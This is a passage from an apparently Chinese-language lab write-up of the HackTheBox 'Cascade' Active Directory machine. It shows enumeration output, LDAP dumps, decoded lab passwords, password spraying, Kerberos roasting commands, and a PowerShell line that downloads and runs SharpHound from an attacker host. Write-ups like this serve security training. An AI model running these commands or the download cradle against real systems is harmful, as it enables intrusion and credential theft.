+group:<span class="o">[</span>Group<span class="w"> </span>Policy<span class="w"> </span>Creator<span class="w"> </span>Owners<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x208<span class="o">]</span>
+group:<span class="o">[</span>DnsUpdateProxy<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x44f<span class="o">]</span>
+
+<span class="o">[</span>+<span class="o">]</span><span class="w">  </span>Getting<span class="w"> </span>domain<span class="w"> </span>group<span class="w"> </span>memberships:
+
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\a</span>dministrator
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\k</span>rbtgt
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\a</span>rksvc
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\s</span>.smith
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\r</span>.thompson
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\u</span>til
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\j</span>.wakefield
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\s</span>.hickson
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\j</span>.goodhand
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\a</span>.turnbull
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\e</span>.crowe
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\b</span>.hanson
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\d</span>.burman
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\B</span>ackupSvc
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\j</span>.allen
+Group:<span class="w"> </span><span class="s1">&#39;Domain Users&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">513</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\i</span>.croft
+Group:<span class="w"> </span><span class="s1">&#39;Group Policy Creator Owners&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">520</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\a</span>dministrator
+Group:<span class="w"> </span><span class="s1">&#39;Domain Guests&#39;</span><span class="w"> </span><span class="o">(</span>RID:<span class="w"> </span><span class="m">514</span><span class="o">)</span><span class="w"> </span>has<span class="w"> </span>member:<span class="w"> </span>CASCADE<span class="se">\C</span>ascGuest
+
+<span class="w"> </span><span class="o">==================(</span><span class="w"> </span>Users<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.10.10.182<span class="w"> </span>via<span class="w"> </span>RID<span class="w"> </span>cycling<span class="w"> </span><span class="o">(</span>RIDS:<span class="w"> </span><span class="m">500</span>-550,1000-1050<span class="o">)</span><span class="w"> </span><span class="o">)==================</span>
+
+
+<span class="o">[</span>I<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>new<span class="w"> </span>SID:
+S-1-5-21-3332504370-1206983947-1165150453
+
+<span class="o">[</span>I<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>new<span class="w"> </span>SID:
+S-1-5-21-2189247330-517467924-712900258
+
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>users<span class="w"> </span>using<span class="w"> </span>SID<span class="w"> </span>S-1-5-21-3332504370-1206983947-1165150453<span class="w"> </span>and<span class="w"> </span>logon<span class="w"> </span>username<span class="w"> </span><span class="s1">&#39;&#39;</span>,<span class="w"> </span>password<span class="w"> </span><span class="s1">&#39;&#39;</span>
+
+S-1-5-21-3332504370-1206983947-1165150453-500<span class="w"> </span>CASCADE<span class="se">\a</span>dministrator<span class="w"> </span><span class="o">(</span>Local<span class="w"> </span>User<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-501<span class="w"> </span>CASCADE<span class="se">\C</span>ascGuest<span class="w"> </span><span class="o">(</span>Local<span class="w"> </span>User<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-502<span class="w"> </span>CASCADE<span class="se">\k</span>rbtgt<span class="w"> </span><span class="o">(</span>Local<span class="w"> </span>User<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-512<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Admins<span class="w"> </span><span class="o">(</span>Domain<span class="w"> </span>Group<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-513<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Users<span class="w"> </span><span class="o">(</span>Domain<span class="w"> </span>Group<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-514<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Guests<span class="w"> </span><span class="o">(</span>Domain<span class="w"> </span>Group<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-515<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Computers<span class="w"> </span><span class="o">(</span>Domain<span class="w"> </span>Group<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-516<span class="w"> </span>CASCADE<span class="se">\D</span>omain<span class="w"> </span>Controllers<span class="w"> </span><span class="o">(</span>Domain<span class="w"> </span>Group<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-517<span class="w"> </span>CASCADE<span class="se">\C</span>ert<span class="w"> </span>Publishers<span class="w"> </span><span class="o">(</span>Local<span class="w"> </span>Group<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-518<span class="w"> </span>CASCADE<span class="se">\S</span>chema<span class="w"> </span>Admins<span class="w"> </span><span class="o">(</span>Domain<span class="w"> </span>Group<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-519<span class="w"> </span>CASCADE<span class="se">\E</span>nterprise<span class="w"> </span>Admins<span class="w"> </span><span class="o">(</span>Domain<span class="w"> </span>Group<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-520<span class="w"> </span>CASCADE<span class="se">\G</span>roup<span class="w"> </span>Policy<span class="w"> </span>Creator<span class="w"> </span>Owners<span class="w"> </span><span class="o">(</span>Domain<span class="w"> </span>Group<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-521<span class="w"> </span>CASCADE<span class="se">\R</span>ead-only<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="w"> </span><span class="o">(</span>Domain<span class="w"> </span>Group<span class="o">)</span>
+S-1-5-21-3332504370-1206983947-1165150453-1001<span class="w"> </span>CASCADE<span class="se">\C</span>ASC-DC1$<span class="w"> </span><span class="o">(</span>Local<span class="w"> </span>User<span class="o">)</span>
+
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>users<span class="w"> </span>using<span class="w"> </span>SID<span class="w"> </span>S-1-5-21-2189247330-517467924-712900258<span class="w"> </span>and<span class="w"> </span>logon<span class="w"> </span>username<span class="w"> </span><span class="s1">&#39;&#39;</span>,<span class="w"> </span>password<span class="w"> </span><span class="s1">&#39;&#39;</span>
+
+S-1-5-21-2189247330-517467924-712900258-500<span class="w"> </span>CASC-DC1<span class="se">\A</span>dministrator<span class="w"> </span><span class="o">(</span>Local<span class="w"> </span>User<span class="o">)</span>
+S-1-5-21-2189247330-517467924-712900258-501<span class="w"> </span>CASC-DC1<span class="se">\G</span>uest<span class="w"> </span><span class="o">(</span>Local<span class="w"> </span>User<span class="o">)</span>
+S-1-5-21-2189247330-517467924-712900258-513<span class="w"> </span>CASC-DC1<span class="se">\N</span>one<span class="w"> </span><span class="o">(</span>Domain<span class="w"> </span>Group<span class="o">)</span>
+</code></pre></div>
+<h3 id="ldap">LDAP</h3>
+<ul>
+<li><code>ldapsearch -x -H "ldap://$IP" -s base namingContexts</code></li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code>dn:
+namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
+namingContexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
+namingContexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
+namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
+namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
+</code></pre></div>
+<ul>
+<li><code>ldapsearch -x -H "ldap://$IP" -b "DC=cascade,DC=local" &gt; ldap_cascade.local</code></li>
+<li><code>cat ldap_cascade.local | grep userPrincipalName</code> 查看账户</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code>userPrincipalName:<span class="w"> </span>CascGuest@cascade.local
+userPrincipalName:<span class="w"> </span>arksvc@cascade.local
+userPrincipalName:<span class="w"> </span>s.smith@cascade.local
+userPrincipalName:<span class="w"> </span>r.thompson@cascade.local
+userPrincipalName:<span class="w"> </span>util@cascade.local
+userPrincipalName:<span class="w"> </span>j.wakefield@cascade.local
+userPrincipalName:<span class="w"> </span>s.hickson@cascade.local
+userPrincipalName:<span class="w"> </span>j.goodhand@cascade.local
+userPrincipalName:<span class="w"> </span>a.turnbull@cascade.local
+userPrincipalName:<span class="w"> </span>e.crowe@cascade.local
+userPrincipalName:<span class="w"> </span>b.hanson@cascade.local
+userPrincipalName:<span class="w"> </span>d.burman@cascade.local
+userPrincipalName:<span class="w"> </span>BackupSvc@cascade.local
+userPrincipalName:<span class="w"> </span>j.allen@cascade.local
+userPrincipalName:<span class="w"> </span>i.croft@cascade.local
+</code></pre></div>
+<ul>
+<li><code>cat ldap_cascade.local | grep 'OU=Service Accounts'</code> 查看服务账户</li>
+<li><code>cat ldap_cascade.local | grep -iE 'p.?.?.?w.?.?d'</code> 查看密码信息</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code>badPasswordTime:<span class="w"> </span><span class="m">132247275952778272</span>
+pwdLastSet:<span class="w"> </span><span class="m">132247150854857364</span>
+badPwdCount:<span class="w"> </span><span class="m">3</span>
+badPasswordTime:<span class="w"> </span><span class="m">133505669601565102</span>
+pwdLastSet:<span class="w"> </span><span class="m">132230718862636251</span>
+cascadeLegacyPwd:<span class="w"> </span><span class="nv">clk0bjVldmE</span><span class="o">=</span>
+badPwdCount:<span class="w"> </span><span class="m">0</span>
+badPasswordTime:<span class="w"> </span><span class="m">0</span>
+pwdLastSet:<span class="w"> </span><span class="m">132233548311955855</span>
+badPwdCount:<span class="w"> </span><span class="m">1</span>
+</code></pre></div>
+<ul>
+<li><code>cat ldap_cascade.local | grep clk0bjVldmE= -C 20</code> 查看关键信息上下文</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code>countryCode:<span class="w"> </span><span class="m">0</span>
+badPasswordTime:<span class="w"> </span><span class="m">133505669601565102</span>
+lastLogoff:<span class="w"> </span><span class="m">0</span>
+lastLogon:<span class="w"> </span><span class="m">132247339125713230</span>
+pwdLastSet:<span class="w"> </span><span class="m">132230718862636251</span>
+primaryGroupID:<span class="w"> </span><span class="m">513</span>
+objectSid::<span class="w"> </span><span class="nv">AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA</span><span class="o">==</span>
+accountExpires:<span class="w"> </span><span class="m">9223372036854775807</span>
+logonCount:<span class="w"> </span><span class="m">2</span>
+sAMAccountName:<span class="w"> </span>r.thompson
+sAMAccountType:<span class="w"> </span><span class="m">805306368</span>
+userPrincipalName:<span class="w"> </span>r.thompson@cascade.local
+objectCategory:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
+dSCorePropagationData:<span class="w"> </span><span class="m">20200126183918</span>.0Z
+dSCorePropagationData:<span class="w"> </span><span class="m">20200119174753</span>.0Z
+dSCorePropagationData:<span class="w"> </span><span class="m">20200119174719</span>.0Z
+dSCorePropagationData:<span class="w"> </span><span class="m">20200119174508</span>.0Z
+dSCorePropagationData:<span class="w"> </span><span class="m">16010101000000</span>.0Z
+lastLogonTimestamp:<span class="w"> </span><span class="m">132294360317419816</span>
+msDS-SupportedEncryptionTypes:<span class="w"> </span><span class="m">0</span>
+cascadeLegacyPwd:<span class="w"> </span><span class="nv">clk0bjVldmE</span><span class="o">=</span>
+
+<span class="c1"># {4026EDF8-DBDA-4AED-8266-5A04B80D9327}, Policies, System, cascade.local</span>
+dn:<span class="w"> </span><span class="nv">CN</span><span class="o">={</span>4026EDF8-DBDA-4AED-8266-5A04B80D9327<span class="o">}</span>,CN<span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>cascade
+<span class="w"> </span>,DC<span class="o">=</span><span class="nb">local</span>
+
+<span class="c1"># {D67C2AD5-44C7-4468-BA4C-199E75B2F295}, Policies, System, cascade.local</span>
+dn:<span class="w"> </span><span class="nv">CN</span><span class="o">={</span>D67C2AD5-44C7-4468-BA4C-199E75B2F295<span class="o">}</span>,CN<span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>cascade
+<span class="w"> </span>,DC<span class="o">=</span><span class="nb">local</span>
+
+<span class="c1"># Util, Services, Users, UK, cascade.local</span>
+dn:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Util,OU<span class="o">=</span>Services,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
+objectClass:<span class="w"> </span>top
+objectClass:<span class="w"> </span>person
+objectClass:<span class="w"> </span>organizationalPerson
+objectClass:<span class="w"> </span>user
+cn:<span class="w"> </span>Util
+distinguishedName:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Util,OU<span class="o">=</span>Services,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
+instanceType:<span class="w"> </span><span class="m">4</span>
+whenCreated:<span class="w"> </span><span class="m">20200109194521</span>.0Z
+whenChanged:<span class="w"> </span><span class="m">20200128180947</span>.0Z
+</code></pre></div>
+<h3 id="kerberos-sec">kerberos-sec</h3>
+<ul>
+<li><code>kerbrute userenum --dc $IP -d $DOMAIN /usr/share/seclists/Usernames/cirt-default-usernames.txt</code></li>
+</ul>
+<h2 id="shell-as-user-rthompson">Shell as User - r.thompson</h2>
+<ul>
+<li><code>echo clk0bjVldmE= | base64 -d</code></li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">USER1</span><span class="o">=</span>r.thompson<span class="w"> </span><span class="nv">PASS1</span><span class="o">=</span>rY4n5eva<span class="w"> </span><span class="nv">CRED1</span><span class="o">=</span><span class="nv">$USER1</span>:<span class="nv">$PASS1</span>
+</code></pre></div>
+<h3 id="_1">密码喷射</h3>
+<ul>
+<li><code>crackmapexec smb $IP -u user.list  -p pass.list --continue-on-success</code></li>
+</ul>
+<p><img alt="image-20240125173305799" src="../assets/image-20240125173305799.png" /></p>
+<h3 id="as-reproasting">AS-REPRoasting</h3>
+<p><code>impacket-GetNPUsers -dc-ip $IP -no-pass $DOMAIN/ -usersfile user.list</code></p>
+<h3 id="kerberoasting">Kerberoasting</h3>
+<p><code>impacket-GetUserSPNs -dc-ip $IP $DOMAIN/$CRED1</code></p>
+<h3 id="bloodhound">BloodHound</h3>
+<p><code>bloodhound-python -d $DOMAIN -u USER1 -p PASS1 -c all -ns $IP</code></p>
+<h3 id="smb_1">SMB</h3>
+<ul>
+<li><code>crackmapexec smb $IP -u $USER1 -p $PASS1 --shares</code></li>
+</ul>
+<p><img alt="image-20240125173420664" src="../assets/image-20240125173420664.png" /></p>
+<ul>
+<li><code>mount -t cifs //$IP/Data M -o username=$USER1</code> 挂载 SMB</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code>.
+├──<span class="w"> </span>Contractors
+├──<span class="w"> </span>Finance
+├──<span class="w"> </span>IT
+│<span class="w">   </span>├──<span class="w"> </span>Email<span class="w"> </span>Archives
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>Meeting_Notes_June_2018.html
+│<span class="w">   </span>├──<span class="w"> </span>LogonAudit
+│<span class="w">   </span>├──<span class="w"> </span>Logs
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>Ark<span class="w"> </span>AD<span class="w"> </span>Recycle<span class="w"> </span>Bin
+│<span class="w">   </span>│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>ArkAdRecycleBin.log
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>DCs
+│<span class="w">   </span>│<span class="w">       </span>└──<span class="w"> </span>dcdiag.log
+│<span class="w">   </span>└──<span class="w"> </span>Temp
+│<span class="w">       </span>├──<span class="w"> </span>r.thompson
+│<span class="w">       </span>└──<span class="w"> </span>s.smith
+│<span class="w">           </span>└──<span class="w"> </span>VNC<span class="w"> </span>Install.reg
+├──<span class="w"> </span>Production
+└──<span class="w"> </span>Temps
+</code></pre></div>
+<h2 id="shell-as-user-ssmith">Shell as User - s.smith</h2>
+<ul>
+<li>VNC Install.reg</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code>...
+<span class="s2">&quot;EnableUrlParams&quot;</span><span class="o">=</span>dword:00000001
+<span class="s2">&quot;Password&quot;</span><span class="o">=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
+<span class="s2">&quot;AlwaysShared&quot;</span><span class="o">=</span>dword:00000000
+...
+</code></pre></div>
+<ul>
+<li>解密后得到 <code>sT333ve2</code></li>
+</ul>
+<blockquote>
+<p>https://github.com/jeroennijhof/vncpwd</p>
+</blockquote>
+<p><img alt="image-20240126154912841" src="../assets/image-20240126154912841.png" /></p>
+<p><img alt="image-20240126154936033" src="../assets/image-20240126154936033.png" /></p>
+<ul>
+<li>Meeting_Notes_June_2018.html  发现迁移用的临时管理员 TempAdmin</li>
+</ul>
+<p><img alt="image-20240126155007416" src="../assets/image-20240126155007416.png" /></p>
+<ul>
+<li>把新的到的账号密码添加到字典中，再次尝试密码喷射</li>
+</ul>
+<p><img alt="image-20240126155248209" src="../assets/image-20240126155248209.png" /></p>
+<ul>
+<li>得到 s.smith 用户凭据</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">IP</span><span class="o">=</span><span class="m">10</span>.10.10.182<span class="w"> </span><span class="nv">DOMAIN</span><span class="o">=</span>cascade.local<span class="w"> </span><span class="nv">USER1</span><span class="o">=</span>r.thompson<span class="w"> </span><span class="nv">PASS1</span><span class="o">=</span>rY4n5eva<span class="w"> </span><span class="nv">CRED1</span><span class="o">=</span><span class="nv">$USER1</span>:<span class="nv">$PASS1</span><span class="w"> </span><span class="nv">USER2</span><span class="o">=</span>s.smith<span class="w"> </span><span class="nv">PASS2</span><span class="o">=</span>sT333ve2<span class="w"> </span><span class="nv">CRED2</span><span class="o">=</span><span class="nv">$USER2</span>:<span class="nv">$PASS2</span>
+</code></pre></div>
+<p><img alt="image-20240126155521757" src="../assets/image-20240126155521757.png" /></p>
+<p>发现在 <code>CASCADE\Audit Share</code> 中</p>
+<h3 id="bloodhound_1">BloodHound</h3>
+<div class="language-shell-session highlight"><pre><span></span><code><span class="go">./SharpHound.exe -CollectionMethod All</span>
+<span class="go">powershell -c &quot;IEX(New-Object Net.Webclient).downloadstring(&#39;http://10.10.16.12/SharpHound.ps1&#39;);Invoke-BloodHound -CollectionMethod All&quot;</span>
+<span class="go">faketime -f &#39;-8h&#39; bloodhound-python -d $DOMAIN -u USER2 -p PASS2 -c all -ns $IP --zip</span>
+<span class="go">Blood</span>
+</code></pre></div>
+<p>执行有点问题</p>
+<h3 id="smb_2">SMB</h3>
+<p><img alt="image-20240126165532150" src="../assets/image-20240126165532150.png" /></p>
+<ul>
+<li><code>mount -t cifs //$IP/Audit$ M -o username=$USER2</code></li>
+</ul>
+<p><img alt="image-20240126165706067" src="../assets/image-20240126165706067.png" /></p>
+<ul>
+<li>发现 <code>Audit.db</code> 打开看一下</li>
+</ul>
+<p><img alt="image-20240126165941218" src="../assets/image-20240126165941218.png" /></p>
+<ul>
+<li>密码都不对</li>
+</ul>
+<p><img alt="image-20240126170352782" src="../assets/image-20240126170352782.png" /></p>
+<p>Shell as User - ArkSvc</p>
+<ul>
+<li>RunAudit.bat</li>
+</ul>
+<p><img alt="image-20240126170441410" src="../assets/image-20240126170441410.png" /></p>
+<p>程序需要加载这个 db 文件，也许和密码相关</p>
+<h2 id="shell-as-user-arksvc">Shell as User - ArkSvc</h2>
+<h3 id="_2">逆向分析</h3>
+<p><img alt="image-20240126171236631" src="../assets/image-20240126171236631.png" /></p>
+<p>.net 框架，用 dnspy 调试一下</p>
+<ul>
+<li>dnspy 打开，添加参数</li>
+</ul>
+<p><img alt="image-20240126171358155" src="../assets/image-20240126171358155.png" /></p>
+<ul>
+<li>在 MainModule 中看到类似密码解密的函数</li>
+</ul>
+<p><img alt="image-20240126172047989" src="../assets/image-20240126172047989.png" /></p>
+<p>因此尝试动态调试，看一下解密后的值</p>
+<ul>
+<li>在解密函数运行后添加断点</li>
+</ul>
+<p><img alt="image-20240126172928660" src="../assets/image-20240126172928660.png" /></p>
+<ul>
+<li>得到 ArkSvc 凭据</li>
+</ul>
+<div class="language-shell highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">IP</span><span class="o">=</span><span class="m">10</span>.10.10.182<span class="w"> </span><span class="nv">DOMAIN</span><span class="o">=</span>cascade.local<span class="w"> </span><span class="nv">USER1</span><span class="o">=</span>r.thompson<span class="w"> </span><span class="nv">PASS1</span><span class="o">=</span>rY4n5eva<span class="w"> </span><span class="nv">CRED1</span><span class="o">=</span><span class="nv">$USER1</span>:<span class="nv">$PASS1</span><span class="w"> </span><span class="nv">USER2</span><span class="o">=</span>s.smith<span class="w"> </span><span class="nv">PASS2</span><span class="o">=</span>sT333ve2<span class="w"> </span><span class="nv">CRED2</span><span class="o">=</span><span class="nv">$USER2</span>:<span class="nv">$PASS2</span><span class="w"> </span><span class="nv">USER3</span><span class="o">=</span>ArkSvc<span class="w"> </span><span class="nv">PASS3</span><span class="o">=</span>w3lc0meFr31nd<span class="w"> </span><span class="nv">CRED3</span><span class="o">=</span><span class="nv">$USER3</span>:<span class="nv">$PASS3</span>
+</code></pre></div>
+<h3 id="bloodhound_2">BloodHound</h3>
+<div class="language-shell-session highlight"><pre><span></span><code><span class="go">./SharpHound.exe -CollectionMethod All</span>
+<span class="go">powershell -c &quot;IEX(New-Object Net.Webclient).downloadstring(&#39;http://10.10.16.12/SharpHound.ps1&#39;);Invoke-BloodHound -CollectionMethod All&quot;</span>
+<span class="go">faketime -f &#39;-8h&#39; bloodhound-python -d $DOMAIN -u USER2 -p PASS2 -c all -ns $IP --zip</span>
+<span class="go">Blood</span>
+</code></pre></div>
+<p>执行有点问题</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.expand", "navigation.path", "navigation.top", "toc.follow", "toc.integrate", "navigation.instant", "navigation.instant.progress", "header.autohide"], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.e1c3ead8.min.js"></script>
+      
+    
+  </body>
+</html>
